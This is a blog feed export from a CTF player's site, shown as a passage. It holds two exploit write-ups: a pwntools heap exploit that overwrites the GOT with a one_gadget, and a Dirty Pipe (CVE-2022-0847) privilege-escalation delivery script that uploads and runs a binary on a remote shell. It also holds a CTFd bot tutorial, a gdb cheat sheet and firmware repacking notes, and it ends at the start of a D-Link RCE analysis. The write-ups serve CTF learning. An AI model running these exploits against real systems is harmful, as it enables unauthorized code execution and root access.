href="#这是堆🐴" class="headerlink" title="这是堆🐴"></a>这是堆🐴</h2><p>这道题由于heap角标检测可以为负，利用一个指向自己的指针实现任意地址写，随后劫持got为one_gadget即可</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># io = process(&#x27;./pwn&#x27;)</span><br>io = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28432</span>)<br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>heap = <span class="hljs-number">0x6020e0</span><br>puts = <span class="hljs-number">0x602018</span> <span class="hljs-comment">#-25</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,text</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Index:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    io.recvuntil(<span class="hljs-string">&#x27;Content:&#x27;</span>)<br>    io.sendline(text)<br><br>edit(-<span class="hljs-number">12</span>,p64(<span class="hljs-number">0x602038</span>))    <br>show(-<span class="hljs-number">12</span>)<br><br><span class="hljs-comment"># io.recvunti(&#x27;Content:&#x27;)</span><br>puts = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts - libc.symbols[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>pause()<br>success(<span class="hljs-string">&quot;puts_addr--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(puts))<br>success(<span class="hljs-string">&quot;libc_base--&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br><br>one_gadget = libc_base + <span class="hljs-number">0xe3b01</span><br>edit(-<span class="hljs-number">12</span>,p64(one_gadget))<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="KMario"><a href="#KMario" class="headerlink" title="KMario"></a>KMario</h2><p>一道kernel题目，利用CVE-2022-0847实现本地提权。关键在于远端没有gcc，所以只能本地编译好。先把elf转为base64，随后在远端转回elf文件即可。</p><blockquote><p>POC链接：<a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits">CVE-2022-0847-DirtyPipe-Exploits</a></p><p>不过我自己做的时候似乎由于elf文件太大，一直传不上去，看了夜悠师傅的exp才发现压缩一下就好，我真是个铸币</p></blockquote><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>cmd = <span class="hljs-string">&#x27;$ &#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">r</span>):<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;stty -echo&#x27;</span>)<br>    os.system(<span class="hljs-string">&#x27;gzip -c ./exp2 &gt; ./exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cd /tmp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;cat &lt;&lt;EOF &gt; exp.gz.b64&#x27;</span>)<br>    r.sendline((read(<span class="hljs-string">&#x27;./exp.gz&#x27;</span>)).encode(<span class="hljs-string">&#x27;base64&#x27;</span>))<br>    r.sendline(<span class="hljs-string">&#x27;EOF&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;base64 -d exp.gz.b64 &gt; exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;gunzip ./exp.gz&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;chmod +x ./exp&#x27;</span>)<br>    r.sendlineafter(cmd, <span class="hljs-string">&#x27;./exp /pwnmeplz&#x27;</span>)<br>    r.interactive()<br><br><br>p = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25457</span>)<br><span class="hljs-comment"># p = process(&#x27;./start.sh&#x27;)</span><br>exploit(p)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【CTFd 二次开发】解题播报机器人 V1</title>
    <link href="/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/"/>
    <url>/2022/10/11/%E3%80%90CTFd%20%E4%BA%8C%E6%AC%A1%E5%BC%80%E5%8F%91%E3%80%91%E8%A7%A3%E9%A2%98%E6%92%AD%E6%8A%A5%E6%9C%BA%E5%99%A8%E4%BA%BA%20V1/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文基于 CTFd Version 3.4.3 开发，可能存在源码不相同的情况，阅读时请注意文章时效性。机器人会一直更新，后续应该会有一二三血播报等更详尽的功能</p><p>注：本文不做机器人相关代码更改，直接利用nonebot自带接口实现</p></blockquote><h2 id="前端页面修改"><a href="#前端页面修改" class="headerlink" title="前端页面修改"></a>前端页面修改</h2><h3 id="config-html"><a href="#config-html" class="headerlink" title="config.html"></a>config.html</h3><p>打开<code>CTFd/CTFd/themes/admin/templates/config.html</code>，更改左侧栏目标题</p><p><img src="/img/article/botv1/image-20221011092121090.png" alt="config.html"></p><h3 id="apperance-html"><a href="#apperance-html" class="headerlink" title="apperance.html"></a>apperance.html</h3><p>打开<code>CTFd/CTFd/themes/admin/templates/configs/appearance.html</code>，在其中插入代码，完整html如下</p><blockquote><p>因可能存在CTFd不同版本页面不同的问题，请视具体情况更改html页面</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;tabpanel&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;tab-pane config-section active&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;appearance&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">autocomplete</span>=<span class="hljs-string">&quot;off&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;w-100&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;ctf_name&quot;</span>&gt;</span><br>Competition Name<br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span>Competition name displayed instead of a logo<span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;ctf_name&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;CTF Name&quot;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">ctf_name</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">ctf_name</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; ctf_name &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span><br>CTF Description<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>Description for the CTF<br><span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ctf_description&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;5&quot;</span>&gt;</span>&#123;&#123; ctf_description &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-ip&quot;</span>&gt;</span><br>                Bot Address<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    the address of QQ-bot<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    eg. 127.0.0.1:1234<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-ip&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bot_ip&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot_ip</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bot_ip</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bot_ip &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;group-id&quot;</span>&gt;</span><br>                QQ Group Number<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;group-id&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;group_id&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">&#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">group_id</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">group_id</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; group_id &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;bot-text&quot;</span>&gt;</span><br>                Message<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">small</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-text text-muted&quot;</span>&gt;</span><br>                    ep. 恭喜%s做出题目%s，默认第一个参数为用户名，第二个参数为题目名称<br>                <span class="hljs-tag">&lt;/<span class="hljs-name">small</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&#x27;bot-text&#x27;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&#x27;bottext&#x27;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&#x27;text&#x27;</span></span><br><span class="hljs-tag">   &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bottext</span> <span class="hljs-attr">is</span> <span class="hljs-attr">defined</span> <span class="hljs-attr">and</span> <span class="hljs-attr">bottext</span> != <span class="hljs-string">None</span> %&#125;<span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&#123;&#123; bottext &#125;&#125;&quot;</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;botof&quot;</span>&gt;</span><br>                Turn on the Bot<br>            <span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control custom-select&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;botof&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bot&quot;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">0</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">0</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        OFF<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">option</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span> &#123;% <span class="hljs-attr">if</span> <span class="hljs-attr">bot</span> == <span class="hljs-string">1</span> %&#125;<span class="hljs-attr">selected</span>&#123;% <span class="hljs-attr">endif</span> %&#125;&gt;</span><br>                        ON<br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">option</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;btn btn-md btn-primary float-right&quot;</span>&gt;</span>Update<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h3><p><img src="/img/article/botv1/image-20221011093547622.png" alt="前端效果"></p><p>这样就可以在设置页面随时更改了， <code>Bot Address</code>是Bot接收http请求的地址，<code>QQ Group Number</code>是机器人所在的qq群号。如果机器人运行的地址发生变化，或想更改发消息的群号，只需在这里更改即可，目前还不支持同时多个群发送消息，准备等到添加一二三血功能时一起添加。</p><h2 id="后端更改"><a href="#后端更改" class="headerlink" title="后端更改"></a>后端更改</h2><h3 id="view-py"><a href="#view-py" class="headerlink" title="view.py"></a>view.py</h3><p>打开<code>CTFd/CTFd/views.py</code>，添加几个变量，用于接收html页面数据</p><p><img src="/img/article/botv1/image-20221011092849492.png" alt="view.py"></p><h3 id="challenges-py"><a href="#challenges-py" class="headerlink" title="challenges.py"></a>challenges.py</h3><p>打开<code>CTFd/CTFD/api/v1/challenges.py</code>，在解题成功后，调用机器人API即可</p><p><img src="/img/article/botv1/image-20221011093425463.png" alt="challenges.py"></p><h3 id="运行演示"><a href="#运行演示" class="headerlink" title="运行演示"></a>运行演示</h3><p><img src="/img/article/botv1/image-20221011094014448.png" alt="提交flag"></p><p><img src="/img/article/botv1/image-20221011094033270.png" alt="群消息成功发送"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>gdb调试常用指令</title>
    <link href="/2022/10/03/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/10/03/gdb%E8%B0%83%E8%AF%95%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<blockquote><p>gdb常用调试指令，包含pwngdb、pwndbg、peda、gef等插件的指令</p></blockquote><table><thead><tr><th align="center">命令名称</th><th align="center">命令缩写</th><th align="center">命令说明</th></tr></thead><tbody><tr><td align="center">run</td><td align="center">r</td><td align="center">运行一个待调试的程序</td></tr><tr><td align="center">continue</td><td align="center">c</td><td align="center">让暂停的程序继续运行</td></tr><tr><td align="center">next</td><td align="center">n</td><td align="center">运行到下一行</td></tr><tr><td align="center">step</td><td align="center">s</td><td align="center">单步执行，遇到函数会进入</td></tr><tr><td align="center">until</td><td align="center">u</td><td align="center">运行到指定行停下来</td></tr><tr><td align="center">finish</td><td align="center">fi</td><td align="center">结束当前调用函数，回到上一层调用函数处</td></tr><tr><td align="center">return</td><td align="center">return</td><td align="center">结束当前调用函数并返回指定值，到上一层函数调用处</td></tr><tr><td align="center">jump</td><td align="center">j</td><td align="center">将当前程序执行流跳转到指定行或地址</td></tr><tr><td align="center">print</td><td align="center">p</td><td align="center">打印变量或寄存器值</td></tr><tr><td align="center">backtrace</td><td align="center">bt</td><td align="center">查看当前线程的调用堆栈</td></tr><tr><td align="center">frame</td><td align="center">f</td><td align="center">切换到当前调用线程的指定堆栈</td></tr><tr><td align="center">thread</td><td align="center">thread</td><td align="center">切换到指定线程</td></tr><tr><td align="center">break</td><td align="center">b</td><td align="center">添加断点</td></tr><tr><td align="center">tbreak</td><td align="center">tb</td><td align="center">添加临时断点</td></tr><tr><td align="center">delete</td><td align="center">d</td><td align="center">删除断点</td></tr><tr><td align="center">enable</td><td align="center">enable</td><td align="center">启用某个断点</td></tr><tr><td align="center">disable</td><td align="center">disable</td><td align="center">禁用某个断点</td></tr><tr><td align="center">watch</td><td align="center">watch</td><td align="center">监视某一个变量或内存地址的值是否发生变化</td></tr><tr><td align="center">list</td><td align="center">list</td><td align="center">显示源码</td></tr><tr><td align="center">info</td><td align="center">info</td><td align="center">查看断点 &#x2F; 线程等信息</td></tr><tr><td align="center">ptype</td><td align="center">ptype</td><td align="center">查看变量类型</td></tr><tr><td align="center">disassemble</td><td align="center">disassemble</td><td align="center">查看汇编代码</td></tr><tr><td align="center">set args</td><td align="center">set args</td><td align="center">设置程序启动命令行参数</td></tr><tr><td align="center">show args</td><td align="center">show args</td><td align="center">查看设置的命令行参数</td></tr><tr><td align="center">heap –simple</td><td align="center">heap -s</td><td align="center">Simply print malloc_chunk struct’s contents</td></tr><tr><td align="center">heap –verbose</td><td align="center">heap -v</td><td align="center">Print all chunk fields, even unused ones.</td></tr><tr><td align="center">heapinfo</td><td align="center">heapinfo</td><td align="center">输出fastbin，top chunk， unsortbin，tcache等信息</td></tr><tr><td align="center">heapbase</td><td align="center">heapbase</td><td align="center">获取heap基址</td></tr><tr><td align="center">libc</td><td align="center">libc</td><td align="center">获取libc基址</td></tr><tr><td align="center">magic</td><td align="center">magic</td><td align="center">Print useful variable and function in glibc</td></tr><tr><td align="center">at</td><td align="center">at</td><td align="center">Attach by process name</td></tr><tr><td align="center">x&#x2F;20x $addr</td><td align="center">x&#x2F;20x $addr</td><td align="center">查看指定地址内容</td></tr></tbody></table>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT】固件解包及打包</title>
    <link href="/2022/09/16/%E3%80%90IOT%E3%80%91%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E5%8F%8A%E6%89%93%E5%8C%85/"/>
    <url>/2022/09/16/%E3%80%90IOT%E3%80%91%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%8C%85%E5%8F%8A%E6%89%93%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<h2 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">binwalk -eM file.bin<br></code></pre></td></tr></table></figure><h2 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h2><p>首先查看原.bin文件文件结构</p><p><img src="/img/article/iot-bin/image-20220916182204458-1663326116419-2.png" alt="image-20220916182204458"></p><p>然后切割出文件目录之前的头部</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=file.bin of=head.bin bs=1 skip=0 count=1376400<br><span class="hljs-comment">#if是原固件，of是输出文件，bs是单位长度，skip是偏移量，count是分区大小取到文件目录之前</span><br></code></pre></td></tr></table></figure><p>正常解包，然后更改文件内容，随后制作文件目录的bin文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo mksquashfs squashfs-root rootfs.bin -comp xz<br></code></pre></td></tr></table></figure><p>头部和文件部分联合</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">cat</span> header.bin rootfs.bin &gt; pwn.bin<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【IOT 学习三】DLink路由器RCE漏洞 CVE-2019-17621复现</title>
    <link href="/2022/09/16/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%89%E3%80%91CVE-2019-17621%E5%A4%8D%E7%8E%B0/"/>
    <url>/2022/09/16/%E3%80%90IOT%20%E5%AD%A6%E4%B9%A0%E4%B8%89%E3%80%91CVE-2019-17621%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>链接：<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17621#:~:text=%EE%80%80CVE-2019-17621%EE%80%80">CVE - CVE-2019-17621 (mitre.org)</a>. The UPnP endpoint URL %2Fgena.cgi in the,UPnP service when connecting to the local network.)</p><p>The UPnP endpoint URL &#x2F;gena.cgi in the D-Link DIR-859 Wi-Fi router 1.05 and 1.06B01 Beta01 allows an Unauthenticated remote attacker to execute system commands as root, by sending a specially crafted HTTP SUBSCRIBE request to the UPnP service when connecting to the local network.</p></blockquote><p>以上是官网的描述，我自己粗略的翻译下：</p><blockquote><p>D-Link DIR-859 Wi-Fi路由器的1.05与1.06B01 Beta01版固件中UPnP的gena.cgi，允许未经身份验证的远程攻击者，在连接到本地网络时，通过向UPnP发送特定的HTTP SUBSCRIBE请求，从而实现以root身份执行系统命令</p></blockquote><h2 id="UPnP介绍"><a href="#UPnP介绍" class="headerlink" title="UPnP介绍"></a>UPnP介绍</h2><p>在分析前我们首先要了解,什么是<strong>UPnP</strong></p><p>我们说的<strong>UPnP（Universal Plug and Play）</strong>即通用即插即用协议，其作用gena.cgi简单来说就是可以当我们支持UNPN协议的设备开启该协议，当主机或主机上的应用程序向该设备发出端口映射请求时，我们的设备就会自动为主机分配端口并进行端口映射，该协议也是从PNP协议里引申出来的</p><p>这里我也说一下传统使用协议的PNP协议，即 “即插即用”，该协议支持自动为新添加的硬件分配中断和 I&#x2F;O 